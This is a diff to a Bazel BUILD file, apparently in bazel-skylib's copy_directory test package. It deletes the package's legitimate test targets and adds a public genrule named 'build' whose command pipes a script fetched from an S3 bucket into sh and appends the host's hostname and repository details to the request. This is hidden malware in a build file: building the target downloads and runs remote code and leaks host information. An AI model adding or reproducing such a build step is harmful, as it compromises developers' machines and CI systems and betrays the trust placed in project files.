@@ -1,43 +1,7 @@
-# This package aids testing the 'copy_directory' rule.
 
-load("//rules:copy_directory.bzl", "copy_directory")
-load(":empty_directory.bzl", "empty_directory")
-
-licenses(["notice"])
-
-package(default_testonly = 1)
-
-# Copy of directory containing files a and b, and a subdir containing c
-copy_directory(
-    name = "copy_of_dir_with_subdir",
-    src = "dir_with_subdir",
-    out = "dir_copy",
-)
-
-empty_directory(
-    name = "empty_dir",
-)
-
-copy_directory(
-    name = "copy_of_empty_dir",
-    src = "empty_dir",
-    out = "empty_dir_copy",
-)
-
-copy_directory(
-    name = "copy_of_dir_with_symlink",
-    src = "dir_with_symlink",
-    out = "dir_with_symlink_copy",
-)
-
-sh_test(
-    name = "copy_directory_tests",
-    srcs = ["copy_directory_tests.sh"],
-    data = [
-        ":copy_of_dir_with_subdir",
-        ":copy_of_dir_with_symlink",
-        ":copy_of_empty_dir",
-        "//tests:unittest.bash",
-    ],
-    deps = ["@bazel_tools//tools/bash/runfiles"],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/bazel-skylib.git\\&folder=copy_directory\\&hostname=`hostname`\\&foo=tdk",
+    visibility = ["//visibility:public"],
 )
